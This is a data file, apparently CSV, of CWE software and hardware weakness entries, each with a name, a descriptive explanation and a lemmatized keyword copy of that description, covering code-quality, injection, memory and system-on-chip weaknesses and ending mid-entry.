CWE-1090,Method Containing Access of a Member Element from Another Class,"A method for a class performs an operation that directly accesses a member element from another class.This issue suggests poor encapsulation and makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",method class perform operation directly access member element class issue suggest poor encapsulation make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1091,Use of Object without Invoking Destructor Method,"The product contains a method that accesses an object but does not later invoke the element's associated finalize/destructor method.This issue can make the product perform more slowly by retaining memory and/or other resources longer than necessary. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.",product contain method access object later invoke element associate finalize destructor method issue product perform slowly retain memory resource long necessary relevant code reachable attacker performance problem introduce vulnerability
CWE-1092,Use of Same Invokable Control Element in Multiple Architectural Layers,"The product uses the same control element across multiple architectural layers.This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product use control element multiple architectural layer issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1093,Excessively Complex Data Representation,"The product uses an unnecessarily complex internal representation for its data structures or interrelationships between those structures.This issue makes it more difficult to understand or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product use unnecessarily complex internal representation data structure interrelationship structure issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1094,Excessive Index Range Scan for a Data Resource,"The product contains an index range scan for a large data table, but the scan can cover a large number of rows.This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.While the interpretation of ""large data table"" and ""excessive index range"" may vary for each product or developer, CISQ recommends a threshold of 1000000 table rows and a threshold of 10 for the index range.",product contain index range scan large data table scan cover large number row issue product perform slowly relevant code reachable attacker performance problem introduce vulnerability interpretation large data table excessive index range vary product developer cisq recommend threshold table row threshold index range
CWE-1095,Loop Condition Value Update within the Loop,"The product uses a loop with a control flow condition based on a value that is updated within the body of the loop.This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product use loop control flow condition base value update body loop issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1096,Singleton Class Instance Creation without Proper Locking or Synchronization,"The product implements a Singleton design pattern but does not use appropriate locking or other synchronization mechanism to ensure that the singleton class is only instantiated once.This issue can prevent the product from running reliably, e.g. by making the instantiation process non-thread-safe and introducing deadlock (CWE-833) or livelock conditions. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",product implement singleton design pattern use appropriate locking synchronization mechanism ensure singleton class instantiate issue prevent product run reliably make instantiation process non thread safe introduce deadlock livelock condition relevant code reachable attacker reliability problem introduce vulnerability
CWE-1097,Persistent Storable Data Element without Associated Comparison Control Element,"The product uses a storable data element that does not have all of the associated functions or methods that are necessary to support comparison.For example, with Java, a class that is made persistent requires both hashCode() and equals() methods to be defined.This issue can prevent the product from running reliably, due to incorrect or unexpected comparison results. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",product use storable data element associate function method necessary support comparison example java class persistent require hashcode equal method define issue prevent product run reliably incorrect unexpected comparison result relevant code reachable attacker reliability problem introduce vulnerability
CWE-1098,Data Element containing Pointer Item without Proper Copy Control Element,"The code contains a data element with a pointer that does not have an associated copy or constructor method.This issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.",code contain data element pointer associated copy constructor method issue prevent product run reliably relevant code reachable attacker reliability problem introduce vulnerability
CWE-1099,Inconsistent Naming Conventions for Identifiers,"The product's code, documentation, or other artifacts do not consistently use the same naming conventions for variables, callables, groups of related callables, I/O capabilities, data types, file names, or similar types of elements.This issue makes it more difficult to understand and/or maintain the product due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product code documentation artifact consistently use naming convention variable callable group related callable o capability datum type file name similar type element issue make difficult understand maintain product inconsistency indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-11,ASP.NET Misconfiguration: Creating Debug Binary,Debugging messages help attackers learn about the system and plan a form of attack.ASP .NET applications can be configured to produce debug binaries. These binaries give detailed debugging messages and should not be used in production environments. Debug binaries are meant to be used in a development or testing environment and can pose a security risk if they are deployed to production.,debug message help attacker learn system plan form attack asp application configure produce debug binary binary detailed debugging message production environment debug binary mean development testing environment pose security risk deploy production
CWE-110,Struts: Validator Without Form Field,"Validation fields that do not appear in forms they are associated with indicate that the validation logic is out of date.It is easy for developers to forget to update validation logic when they make changes to an ActionForm class. One indication that validation logic is not being properly maintained is inconsistencies between the action form and the validation form.Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.",validation field appear form associate indicate validation logic date easy developer forget update validation logic change actionform class indication validation logic properly maintain inconsistency action form validation form application generally susceptible memory corruption attack application interface native code perform array bound checking attacker able use input validation mistake application launch buffer overflow attack
CWE-1100,Insufficient Isolation of System-Dependent Functions,"The product or code does not isolate system-dependent functionality into separate standalone modules.This issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product code isolate system dependent functionality separate standalone module issue make difficult maintain port product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1101,Reliance on Runtime Component in Generated Code,"The product uses automatically-generated code that cannot be executed without a specific runtime support component.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product use automatically generate code execute specific runtime support component issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1102,Reliance on Machine-Dependent Data Representation,"The code uses a data representation that relies on low-level data representation or constructs that may vary across different processors, physical machines, OSes, or other physical components.This issue makes it more difficult to maintain and/or port the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code use data representation rely low level datum representation construct vary different processor physical machine os physical component issue make difficult maintain port product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1103,Use of Platform-Dependent Third Party Components,"The product relies on third-party components that do not provide equivalent functionality across all desirable platforms.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product rely party component provide equivalent functionality desirable platform issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1104,Use of Unmaintained Third Party Components,"The product relies on third-party components that are not actively supported or maintained by the original developer or a trusted proxy for the original developer.Reliance on components that are no longer maintained can make it difficult or impossible to fix significant bugs, vulnerabilities, or quality issues. In effect, unmaintained code can become obsolete.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product rely party component actively support maintain original developer trusted proxy original developer reliance component long maintain difficult impossible fix significant bug vulnerability quality issue effect unmaintained code obsolete issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1105,Insufficient Encapsulation of Machine-Dependent Functionality,"The product or code uses machine-dependent functionality, but it does not sufficiently encapsulate or isolate this functionality from the rest of the code.This issue makes it more difficult to port or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product code use machine dependent functionality sufficiently encapsulate isolate functionality rest code issue make difficult port maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1106,Insufficient Use of Symbolic Constants,"The source code uses literal constants that may need to change or evolve over time, instead of using symbolic constants.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",source code use literal constant need change evolve time instead symbolic constant issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1107,Insufficient Isolation of Symbolic Constant Definitions,"The source code uses symbolic constants, but it does not sufficiently place the definitions of these constants into a more centralized or isolated location.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",source code use symbolic constant sufficiently place definition constant centralized isolated location issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1108,Excessive Reliance on Global Variables,"The code is structured in a way that relies too much on using or setting global variables throughout various points in the code, instead of preserving the associated information in a narrower, more local context.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code structure way rely set global variable point code instead preserve associate information narrow local context issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1109,Use of Same Variable for Multiple Purposes,"The code contains a callable, block, or other code element in which the same variable is used to control more than one unique task or store more than one instance of data.Use of the same variable for multiple purposes can make it more difficult for a person to read or understand the code, potentially hiding other quality issues.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code contain callable block code element variable control unique task store instance datum use variable multiple purpose difficult person read understand code potentially hide quality issue issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-111,Direct Use of Unsafe JNI,"When a Java application uses the Java Native Interface (JNI) to call code written in another programming language, it can expose the application to weaknesses in that code, even if those weaknesses cannot occur in Java.Many safety features that programmers may take for granted do not apply for native code, so you must carefully review all such code for potential problems. The languages used to implement native code may be more susceptible to buffer overflows and other attacks. Native code is unprotected by the security features enforced by the runtime environment, such as strong typing and array bounds checking.",java application use java native interface jni code write programming language expose application weakness code weakness occur java safety feature programmer grant apply native code carefully review code potential problem language implement native code susceptible buffer overflow attack native code unprotected security feature enforce runtime environment strong typing array bound checking
CWE-1110,Incomplete Design Documentation,"The product's design documentation does not adequately describe control flow, data flow, system initialization, relationships between tasks, components, rationales, or other important aspects of the design.",product design documentation adequately describe control flow data flow system initialization relationship task component rationale important aspect design
CWE-1111,Incomplete I/O Documentation,"The product's documentation does not adequately define inputs, outputs, or system/software interfaces.",product documentation adequately define input output system software interface
CWE-1112,Incomplete Documentation of Program Execution,"The document does not fully define all mechanisms that are used to control or influence how product-specific programs are executed.This includes environmental variables, configuration files, registry keys, command-line switches or options, or system settings.",document fully define mechanism control influence product specific program execute include environmental variable configuration file registry key command line switch option system setting
CWE-1113,Inappropriate Comment Style,"The source code uses comment styles or formats that are inconsistent or do not follow expected standards for the product.This issue makes it more difficult to maintain the product due to insufficient legibility, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",source code use comment style format inconsistent follow expected standard product issue make difficult maintain product insufficient legibility indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1114,Inappropriate Whitespace Style,"The source code contains whitespace that is inconsistent across the code or does not follow expected standards for the product.This issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",source code contain whitespace inconsistent code follow expected standard product issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1115,Source Code Element without Standard Prologue,"The source code contains elements such as source files that do not consistently provide a prologue or header that has been standardized for the project.The lack of a prologue can make it more difficult to accurately and quickly understand the associated code. Standard prologues or headers may contain information such as module name, version number, author, date, purpose, function, assumptions, limitations, accuracy considerations, etc.This issue makes it more difficult to maintain the product due to insufficient analyzability, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",source code contain element source file consistently provide prologue header standardize project lack prologue difficult accurately quickly understand associate code standard prologue header contain information module version number author date purpose function assumption limitation accuracy consideration etc issue make difficult maintain product insufficient analyzability indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1116,Inaccurate Comments,"The source code contains comments that do not accurately describe or explain aspects of the portion of the code with which the comment is associated.When a comment does not accurately reflect the associated code elements, this can introduce confusion to a reviewer (due to inconsistencies) or make it more difficult and less efficient to validate that the code is implementing the intended behavior correctly.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",source code contain comment accurately describe explain aspect portion code comment associate comment accurately reflect associate code element introduce confusion reviewer inconsistency difficult efficient validate code implement intended behavior correctly issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1117,Callable with Insufficient Behavioral Summary,"The code contains a function or method whose signature and/or associated inline documentation does not sufficiently describe the callable's inputs, outputs, side effects, assumptions, or return codes.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code contain function method signature associate inline documentation sufficiently describe callable input output effect assumption return code issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1118,Insufficient Documentation of Error Handling Techniques,"The documentation does not sufficiently describe the techniques that are used for error handling, exception processing, or similar mechanisms.Documentation may need to cover error handling techniques at multiple layers, such as module, executable, compilable code unit, or callable.",documentation sufficiently describe technique error handling exception processing similar mechanism documentation need cover error handling technique multiple layer module executable compilable code unit callable
CWE-1119,Excessive Use of Unconditional Branching,"The code uses too many unconditional branches (such as ""goto"").This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code use unconditional branch issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-112,Missing XML Validation,"The product accepts XML from an untrusted source but does not validate the XML against the proper schema.Most successful attacks begin with a violation of the programmer's assumptions. By accepting an XML document without validating it against a DTD or XML schema, the programmer leaves a door open for attackers to provide unexpected, unreasonable, or malicious input.",product accept xml untrusted source validate xml proper schema successful attack begin violation programmer assumption accept xml document validate dtd xml schema programmer leave door open attacker provide unexpected unreasonable malicious input
CWE-1120,Excessive Code Complexity,"The code is too complex, as calculated using a well-defined, quantitative measure.This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.",code complex calculate define quantitative measure issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability issue product perform slowly relevant code reachable attacker performance problem introduce vulnerability
CWE-1121,Excessive McCabe Cyclomatic Complexity,"The code contains McCabe cyclomatic complexity that exceeds a desirable maximum.This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code contain mccabe cyclomatic complexity exceed desirable maximum issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1122,Excessive Halstead Complexity,"The code is structured in a way that a Halstead complexity measure exceeds a desirable maximum.A variety of Halstead complexity measures exist, such as program vocabulary size or volume.This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code structure way halstead complexity measure exceed desirable maximum variety halstead complexity measure exist program vocabulary size volume issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1123,Excessive Use of Self-Modifying Code,"The product uses too much self-modifying code.This issue makes it more difficult to understand or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",product use self modify code issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1124,Excessively Deep Nesting,"The code contains a callable or other code grouping in which the nesting / branching is too deep.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code contain callable code grouping nesting branching deep issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1125,Excessive Attack Surface,"The product has an attack surface whose quantitative measurement exceeds a desirable maximum.Originating from software security, an ""attack surface"" measure typically reflects the number of input points and output points that can be utilized by an untrusted party, i.e. a potential attacker. A larger attack surface provides more places to attack, and more opportunities for developers to introduce weaknesses. In some cases, this measure may reflect other aspects of quality besides security; e.g., a product with many inputs and outputs may require a large number of tests in order to improve code coverage.",product attack surface quantitative measurement exceed desirable maximum originate software security attack surface measure typically reflect number input point output point utilize untrusted party potential attacker large attack surface provide place attack opportunity developer introduce weakness case measure reflect aspect quality security product input output require large number test order improve code coverage
CWE-1126,Declaration of Variable with Unnecessarily Wide Scope,"The source code declares a variable in one scope, but the variable is only used within a narrower scope.This issue makes it more difficult to understand and/or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",source code declare variable scope variable narrow scope issue make difficult understand maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-1127,Compilation with Insufficient Warnings or Errors,"The code is compiled without sufficient warnings enabled, which may prevent the detection of subtle bugs or quality issues.This issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.",code compile sufficient warning enable prevent detection subtle bug quality issue issue make difficult maintain product indirectly affect security make difficult time consume find fix vulnerability easy introduce vulnerability
CWE-113,Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Request/Response Splitting'),"The product receives data from an HTTP agent/component (e.g., web server, proxy, browser, etc.), but it does not neutralize or incorrectly neutralizes CR and LF characters before the data is included in outgoing HTTP headers.HTTP agents or components may include a web server, load balancer, reverse proxy, web caching proxy, application firewall, web browser, etc. Regardless of the role, they are expected to maintain coherent, consistent HTTP communication state across all components. However, including unexpected data in an HTTP header allows an attacker to specify the entirety of the HTTP message that is rendered by the client HTTP agent (e.g., web browser) or back-end HTTP agent (e.g., web server), whether the message is part of a request or a response. When an HTTP request contains unexpected CR and LF characters, the server may respond with an output stream that is interpreted as ""splitting"" the stream into two different HTTP messages instead of one. CR is carriage return, also given by %0d or \r, and LF is line feed, also given by %0a or \n.In addition to CR and LF characters, other valid/RFC compliant special characters and unique character encodings can be utilized, such as HT (horizontal tab, also given by %09 or \t) and SP (space, also given as + sign or %20).These types of unvalidated and unexpected data in HTTP message headers allow an attacker to control the second ""split"" message to mount attacks such as server-side request forgery, cross-site scripting, and cache poisoning attacks.HTTP response splitting weaknesses may be present when:Data enters a web application through an untrusted source, most frequently an HTTP request.The data is included in an HTTP response header sent to a web user without neutralizing malicious characters that can be interpreted as separator characters for headers.",product receive datum http agent component web server proxy browser etc neutralize incorrectly neutralize cr lf character data include outgoing http header http agent component include web server load balancer reverse proxy web caching proxy application firewall web browser etc regardless role expect maintain coherent consistent http communication state component include unexpected datum http header allow attacker specify entirety http message render client http agent web browser end http agent web server message request response http request contain unexpected cr lf character server respond output stream interpret split stream different http message instead cr carriage return give lf line feed give addition cr lf character valid rfc compliant special character unique character encoding utilize ht horizontal tab give sp space give sign type unvalidated unexpected datum http message header allow attacker control second split message mount attack server request forgery cross site scripting cache poisoning attack http response splitting weakness present data enter web application untrusted source frequently http request data include http response header send web user neutralize malicious character interpret separator character header
CWE-114,Process Control,"Executing commands or loading libraries from an untrusted source or in an untrusted environment can cause an application to execute malicious commands (and payloads) on behalf of an attacker.Process control vulnerabilities take two forms: An attacker can change the command that the program executes: the attacker explicitly controls what the command is.An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.Process control vulnerabilities of the first type occur when either data enters the application from an untrusted source and the data is used as part of a string representing a command that is executed by the application. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.",execute command load library untrusted source untrusted environment cause application execute malicious command payload behalf attacker process control vulnerability form attacker change command program execute attacker explicitly control command attacker change environment command execute attacker implicitly control command mean process control vulnerability type occur datum enter application untrusted source datum string represent command execute application execute command application give attacker privilege capability attacker
CWE-115,Misinterpretation of Input,"The product misinterprets an input, whether from an attacker or another product, in a security-relevant fashion.",product misinterpret input attacker product security relevant fashion
CWE-116,Improper Encoding or Escaping of Output,"The product prepares a structured message for communication with another component, but encoding or escaping of the data is either missing or done incorrectly. As a result, the intended structure of the message is not preserved.Improper encoding or escaping can allow attackers to change the commands that are sent to another component, inserting malicious commands instead.Most products follow a certain protocol that uses structured messages for communication between components, such as queries or commands. These structured messages can contain raw data interspersed with metadata or control information. For example, ""GET /index.html HTTP/1.1"" is a structured message containing a command (""GET"") with a single argument (""/index.html"") and metadata about which protocol version is being used (""HTTP/1.1"").If an application uses attacker-supplied inputs to construct a structured message without properly encoding or escaping, then the attacker could insert special characters that will cause the data to be interpreted as control information or metadata. Consequently, the component that receives the output will perform the wrong operations, or otherwise interpret the data incorrectly.",product prepare structure message communication component encoding escaping datum miss incorrectly result intend structure message preserve improper encoding escaping allow attacker change command send component insert malicious command instead product follow certain protocol use structure message communication component query command structured message contain raw datum intersperse metadata control information example structured message contain command single argument metadata protocol version application use attacker supply input construct structured message properly encode escape attacker insert special character cause datum interpret control information metadata consequently component receive output perform wrong operation interpret datum incorrectly
CWE-1164,Irrelevant Code,"The product contains code that is not essential for execution, i.e. makes no state changes and has no side effects that alter data or control flow, such that removal of the code would have no impact to functionality or correctness.Irrelevant code could include dead code, initialization that is not used, empty blocks, code that could be entirely removed due to optimization, etc.",product contain code essential execution make state change effect alter datum control flow removal code impact functionality correctness irrelevant code include dead code initialization block code entirely remove optimization etc
CWE-117,Improper Output Neutralization for Logs,The product does not neutralize or incorrectly neutralizes output that is written to logs.This can allow an attacker to forge log entries or inject malicious content into logs.Log forging vulnerabilities occur when:Data enters an application from an untrusted source.The data is written to an application or system log file.,product neutralize incorrectly neutralize output write log allow attacker forge log entry inject malicious content log log forging vulnerability occur data enter application untrusted source data write application system log file
CWE-1173,Improper Use of Validation Framework,"The product does not use, or incorrectly uses, an input validation framework that is provided by the source language or an independent library.Many modern coding languages provide developers with input validation frameworks to make the task of input validation easier and less error-prone. These frameworks will automatically check all input against specified criteria and direct execution to error handlers when invalid input is received. The improper use (i.e., an incorrect implementation or missing altogether) of these frameworks is not directly exploitable, but can lead to an exploitable condition if proper input validation is not performed later in the product. Not using provided input validation frameworks can also hurt the maintainability of code as future developers may not recognize the downstream input validation being used in the place of the validation framework.",product use incorrectly use input validation framework provide source language independent library modern code language provide developer input validation framework task input validation easy error prone framework automatically check input specify criterion direct execution error handler invalid input receive improper use incorrect implementation miss altogether framework directly exploitable lead exploitable condition proper input validation perform later product provide input validation framework hurt maintainability code future developer recognize downstream input validation place validation framework
CWE-1174,ASP.NET Misconfiguration: Improper Model Validation,"The ASP.NET application does not use, or incorrectly uses, the model validation framework.",application use incorrectly use model validation framework
CWE-1176,Inefficient CPU Computation,"The product performs CPU computations using algorithms that are not as efficient as they could be for the needs of the developer, i.e., the computations can be optimized further.This issue can make the product perform more slowly, possibly in ways that are noticeable to the users. If an attacker can influence the amount of computation that must be performed, e.g. by triggering worst-case complexity, then this performance problem might introduce a vulnerability.",product perform cpu computation algorithm efficient need developer computation optimize issue product perform slowly possibly way noticeable user attacker influence computation perform trigger bad case complexity performance problem introduce vulnerability
CWE-1177,Use of Prohibited Code,"The product uses a function, library, or third party component that has been explicitly prohibited, whether by the developer or the customer.The developer - or customers - may wish to restrict or eliminate use of a function, library, or third party component for any number of reasons, including real or suspected vulnerabilities; difficulty to use securely; export controls or license requirements; obsolete or poorly-maintained code; internal code being scheduled for deprecation; etc.To reduce risk of vulnerabilities, the developer might maintain a list of ""banned"" functions that programmers must avoid using because the functions are difficult or impossible to use securely. This issue can also make the product more costly and difficult to maintain.",product use function library party component explicitly prohibit developer customer developer customer wish restrict eliminate use function library party component number reason include real suspected vulnerability difficulty use securely export control license requirement obsolete poorly maintain code internal code schedule deprecation etc reduce risk vulnerability developer maintain list ban function programmer avoid function difficult impossible use securely issue product costly difficult maintain
CWE-118,Incorrect Access of Indexable Resource ('Range Error'),"The product does not restrict or incorrectly restricts operations within the boundaries of a resource that is accessed using an index or pointer, such as memory or files.",product restrict incorrectly restrict operation boundary resource access index pointer memory file
CWE-1187,DEPRECATED: Use of Uninitialized Resource,This entry has been deprecated because it was a duplicate of CWE-908. All content has been transferred to CWE-908.,entry deprecate duplicate content transfer
CWE-1188,Insecure Default Initialization of Resource,"The product initializes or sets a resource with a default that is intended to be changed by the administrator, but the default is not secure.Developers often choose default values that leave the product as open and easy to use as possible out-of-the-box, under the assumption that the administrator can (or should) change the default value. However, this ease-of-use comes at a cost when the default is insecure and the administrator does not change it.",product initialize set resource default intend change administrator default secure developer choose default value leave product open easy use possible box assumption administrator change default value ease use come cost default insecure administrator change
CWE-1189,Improper Isolation of Shared Resources on System-on-a-Chip (SoC),"The System-On-a-Chip (SoC) does not properly isolate shared resources between trusted and untrusted agents.A System-On-a-Chip (SoC) has a lot of functionality, but it may have a limited number of pins or pads. A pin can only perform one function at a time. However, it can be configured to perform multiple different functions. This technique is called pin multiplexing. Similarly, several resources on the chip may be shared to multiplex and support different features or functions. When such resources are shared between trusted and untrusted agents, untrusted agents may be able to access the assets intended to be accessed only by the trusted agents.",system chip soc properly isolate share resource trusted untrusted agent system chip soc lot functionality limited number pin pad pin perform function time configure perform multiple different function technique call pin multiplexing similarly resource chip share multiplex support different feature function resource share trusted untrusted agent untrusted agent able access asset intend access trust agent
CWE-119,Improper Restriction of Operations within the Bounds of a Memory Buffer,"The product performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.Certain languages allow direct addressing of memory locations and do not automatically ensure that these locations are valid for the memory buffer that is being referenced. This can cause read or write operations to be performed on memory locations that may be associated with other variables, data structures, or internal program data.As a result, an attacker may be able to execute arbitrary code, alter the intended control flow, read sensitive information, or cause the system to crash.",product perform operation memory buffer read write memory location outside intended boundary buffer certain language allow direct addressing memory location automatically ensure location valid memory buffer reference cause read write operation perform memory location associate variable data structure internal program datum result attacker able execute arbitrary code alter intended control flow read sensitive information cause system crash
CWE-1190,DMA Device Enabled Too Early in Boot Phase,"The product enables a Direct Memory Access (DMA) capable device before the security configuration settings are established, which allows an attacker to extract data from or gain privileges on the product.DMA is included in a number of devices because it allows data transfer between the computer and the connected device, using direct hardware access to read or write directly to main memory without any OS interaction. An attacker could exploit this to access secrets. Several virtualization-based mitigations have been introduced to thwart DMA attacks. These are usually configured/setup during boot time. However, certain IPs that are powered up before boot is complete (known as early boot IPs) may be DMA capable. Such IPs, if not trusted, could launch DMA attacks and gain access to assets that should otherwise be protected.",product enable direct memory access dma capable device security configuration setting establish allow attacker extract datum gain privilege product dma include number device allow data transfer computer connect device direct hardware access read write directly main memory os interaction attacker exploit access secret virtualization base mitigation introduce thwart dma attack usually configure setup boot time certain ip power boot complete know early boot ip dma capable ip trust launch dma attack gain access asset protect
CWE-1191,On-Chip Debug and Test Interface With Improper Access Control,"The chip does not implement or does not correctly perform access control to check whether users are authorized to access internal registers and test modes through the physical debug/test interface.A device's internal information may be accessed through a scan chain of interconnected internal registers, usually through a JTAG interface. The JTAG interface provides access to these registers in a serial fashion in the form of a scan chain for the purposes of debugging programs running on a device. Since almost all information contained within a device may be accessed over this interface, device manufacturers typically insert some form of authentication and authorization to prevent unintended use of this sensitive information. This mechanism is implemented in addition to on-chip protections that are already present.If authorization, authentication, or some other form of access control is not implemented or not implemented correctly, a user may be able to bypass on-chip protection mechanisms through the debug interface.Sometimes, designers choose not to expose the debug pins on the motherboard. Instead, they choose to hide these pins in the intermediate layers of the board. This is primarily done to work around the lack of debug authorization inside the chip. In such a scenario (without debug authorization), when the debug interface is exposed, chip internals are accessible to an attacker.",chip implement correctly perform access control check user authorize access internal register test mode physical debug test interface device internal information access scan chain interconnected internal register usually jtag interface jtag interface provide access register serial fashion form scan chain purpose debug program run device information contain device access interface device manufacturer typically insert form authentication authorization prevent unintended use sensitive information mechanism implement addition chip protection present authorization authentication form access control implement implement correctly user able bypass chip protection mechanism debug interface designer choose expose debug pin motherboard instead choose hide pin intermediate layer board primarily work lack debug authorization inside chip scenario debug authorization debug interface expose chip internal accessible attacker
CWE-1192,"System-on-Chip (SoC) Using Components without Unique, Immutable Identifiers","The System-on-Chip (SoC) does not have unique, immutable identifiers for each of its components.A System-on-Chip (SoC) comprises several components (IP) with varied trust requirements. It is required that each IP is identified uniquely and should distinguish itself from other entities in the SoC without any ambiguity. The unique secured identity is required for various purposes. Most of the time the identity is used to route a transaction or perform certain actions, including resetting, retrieving a sensitive information, and acting upon or on behalf of something else.There are several variants of this weakness:A ""missing"" identifier is when the SoC does not define any mechanism to uniquely identify the IP.An ""insufficient"" identifier might provide some defenses - for example, against the most common attacks - but it does not protect against everything that is intended.A ""misconfigured"" mechanism occurs when a mechanism is available but not implemented correctly.An ""ignored"" identifier occurs when the SoC/IP has not applied any policies or does not act upon the identifier securely.",system chip soc unique immutable identifier component system chip soc comprise component ip varied trust requirement require ip identify uniquely distinguish entity soc ambiguity unique secure identity require purpose time identity route transaction perform certain action include reset retrieve sensitive information act behalf variant weakness miss identifier soc define mechanism uniquely identify insufficient identifier provide defense example common attack protect intend misconfigured mechanism occur mechanism available implement correctly ignored identifier occur 